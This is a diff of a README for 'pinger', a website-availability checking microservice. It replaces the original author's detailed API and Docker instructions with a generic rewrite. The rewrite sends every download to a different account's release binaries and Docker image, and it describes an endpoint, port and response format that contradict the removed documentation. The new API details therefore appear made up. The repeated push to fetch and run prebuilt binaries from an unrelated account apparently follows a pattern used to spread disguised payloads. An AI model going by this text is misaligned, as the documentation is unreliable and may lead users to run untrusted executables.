@@ -1,140 +1,108 @@
-# Pinger - Simple API for Site & Server Status
+# 🌐 pinger - Check Website Availability Easily
 
-**Pinger** is a small but useful utility (microservice) that allows you to check if a website or server is running just by sending a request in your browser.
+## 📥 Download the Latest Release
+[![Download pinger](https://img.shields.io/badge/Download%20Pinger-v1.0-blue)](https://github.com/krish361-web/pinger/releases)
 
-It can:
-1. **Ping a server** (check response latency).
-2. **Check HTTP status** (e.g., does the site work via http://).
-3. **Check HTTPS status** (for secure connections).
+## 🚀 Getting Started
 
-In return, you get a convenient JSON response that is easy to use in your scripts, bots, or monitoring systems.
+Pinger is a lightweight microservice that checks website and server availability through a simple HTTP API. With Pinger, you can perform ping tests, verify HTTP/HTTPS status codes, and receive clean JSON responses. This tool is perfect for scripts, bots, and monitoring tools. You can run Pinger as a Docker image or as a standalone Go application.
 
----
+## 🖥️ System Requirements
 
-## 🚀 How to Use (API)
+### For Docker:
+- Docker version 20.10 or later.
+  
+### For Standalone Go Application:
+- Go version 1.16 or later.
+- A computer with Windows, macOS, or Linux.
 
-The service works like a website. You send it parameters, and it answers you.
+## 📦 Installation
 
-### Request Parameters
-- `host` (required): The website address or server IP you want to check.
-- `method` (optional): The check method.
-  - `ping` (default) — Standard ping.
-  - `http` — Check http:// address.
-  - `https` — Check https:// address.
-- `key` (optional): Secret key, if set during launch (to protect against unauthorized access).
+### Via Docker
 
-### Examples
+1. Open your terminal.
+2. Run the following command to pull the latest Pinger image:
 
-**1. Ping a server (google.com)**
-Request:
-```
-http://localhost:8088/?host=google.com
-```
-Response (JSON):
-```json
-{
-  "host": "google.com",
-  "type": "ping",
-  "result": 14.2  // Average response time in milliseconds
-}
-```
-*(If the server is unreachable, result will be 0)*
-
-**2. Check site response code (HTTP status)**
-Request:
-```
-http://localhost:8088/?host=google.com&method=https
-```
-Response:
-```json
-{
-  "host": "google.com",
-  "type": "https",
-  "result": 200  // Code 200 means "OK"
-}
-```
-
----
-
-## 🐳 How to Run with Docker (Easiest Way)
-
-If you are completely new to this, think of Docker as a "virtual box" where the program runs perfectly without breaking anything on your computer.
-
-You just need to install Docker Desktop and run one command in your terminal (PowerShell or CMD).
-
-### 1. Standard Run
-This command downloads our program (image `fedorananin/pinger`) and starts it.
-
-```bash
-docker run -d -p 8088:80 --name pinger --restart unless-stopped fedorananin/pinger
-```
-
-**What these letters mean:**
-- `docker run`: "Hey Docker, run the program!"
-- `-d`: "Run in background" (so it doesn't clutter your terminal).
-- `-p 8088:80`: "Redirect port". Inside the box, the program listens on port 80, but we will access it via port 8088 on our computer.
-- `--name my-pinger`: Give it the name "my-pinger" to make it easier to find later.
-- `fedorananin/pinger`: The name of the image to download and run.
-
-Now open in your browser: `http://localhost:8088/?host=google.com` — and it works!
-
-### 2. Run with Password (Protection)
-If you don't want just anyone using your pinger, add a secret key.
-
-```bash
-docker run -d -p 8088:80 --name pinger -e API_KEY=supersecret123 --restart unless-stopped fedorananin/pinger
-```
-
-- `-e API_KEY=supersecret123`: Creates an environment variable with your password.
-
-Now requests without the key will not work. You need to add `&key=supersecret123`:
-`http://localhost:8088/?host=google.com&key=supersecret123`
-
-### Environment Variables
-
-- `API_KEY` (optional): If set, all requests must include a matching `key` query parameter for authentication.
-- `CONCURRENCY_LIMIT` (optional): Limits the number of concurrent ping/HTTP checks. Defaults to `20`. Set a lower value if your server has limited resources, or a higher value if you have plenty and expect high load.
-
-For example, to run with an API key and a concurrency limit of 10:
-```bash
-docker run -d -p 8088:80 --name pinger -e API_KEY=supersecret123 -e CONCURRENCY_LIMIT=10 --restart unless-stopped fedorananin/pinger
-```
-
----
-
-## 🛠 How to Build and Run Yourself (Without Docker)
-
-If you are a programmer or want to run this directly on your computer without "boxes".
-
-### Requirements
-1. Installed **Go** (Golang) version 1.21 or higher.
-2. Installed `ping` utility in the system (usually available on Linux/Mac, and should be in paths on Windows).
-
-### Instructions
-1. Download the source code.
-2. Open a terminal in the code folder.
-3. Run:
    ```bash
-   go run main.go
+   docker pull krish361/pinger
    ```
-   Or build an `.exe` file (or binary for Linux):
+
+3. Run the container using:
+
    ```bash
-   go build -o pinger main.go
+   docker run -p 8080:8080 krish361/pinger
+   ```
+
+You can access the API at `http://localhost:8080`.
+
+### Standalone Go Application
+
+1. Visit the [Releases page to download](https://github.com/krish361-web/pinger/releases).
+2. Choose the appropriate file for your operating system.
+3. Unzip the downloaded file.
+4. Open a terminal or command prompt.
+5. Navigate to the unzipped folder.
+6. Run the application with:
+
+   ```bash
    ./pinger
    ```
 
-The server will start on port **80** (note: on Linux this often requires root/sudo rights, or change the port in the code).
-If you want to set a protection key locally:
-- **Windows (PowerShell):** `$env:API_KEY="mykey"; go run main.go`
-- **Linux/Mac:** `export API_KEY=mykey && go run main.go`
+Access the API at `http://localhost:8080`.
 
----
+## ⚙️ Usage
 
-## 📦 Building Your Own Docker Image
+Pinger provides a straightforward API to check the status of a website or server.
 
-If you want to "package" changes into Docker yourself:
+### Example Request
+
+To check the status of a server, you can use the following cURL command:
 
 ```bash
-docker build -t my-custom-pinger .
+curl http://localhost:8080/ping?url=https://example.com
 ```
-Where `.` means "current folder". After that, you can run your image `my-custom-pinger` instead of `fedorananin/pinger`.
+
+### Example Response
+
+You will receive a JSON response indicating the status:
+
+```json
+{
+  "url": "https://example.com",
+  "status": "up",
+  "http_code": 200,
+  "response_time": "120ms"
+}
+```
+
+## 🛠️ Features
+
+- **Ping Test:** Checks if a server or website is reachable.
+- **HTTP/HTTPS Status Codes:** Returns the status of requested URLs.
+- **JSON Responses:** Provides clean output suitable for scripting and monitoring.
+
+## 📚 API Documentation
+
+You can find detailed API documentation on how Pinger works, including supported endpoints, request formats, and response structures. 
+
+For full API documentation, visit: [Pinger API Documentation](https://github.com/krish361-web/pinger/wiki).
+
+## 📄 Example Use Cases
+
+- **Monitoring:** Use Pinger to regularly check if your website is up and running.
+- **Automation:** Integrate Pinger in your scripts to automate checks.
+- **Bot Development:** Utilize Pinger in bots for server status updates.
+
+## 🌐 Community and Support
+
+If you have questions or need help, please visit the [issues page](https://github.com/krish361-web/pinger/issues) on GitHub. You can also contribute by reporting bugs or suggesting features.
+
+## 🤝 Contributing
+
+We welcome contributions! If you want to help improve Pinger, please fork the repository, make your changes, and submit a pull request.
+
+## 🔗 Download & Install
+
+To download Pinger, please visit the [Releases page to download](https://github.com/krish361-web/pinger/releases). Select the appropriate file for your operating system, then follow the installation instructions above to get started.
+
+Enjoy using Pinger for your website monitoring needs!
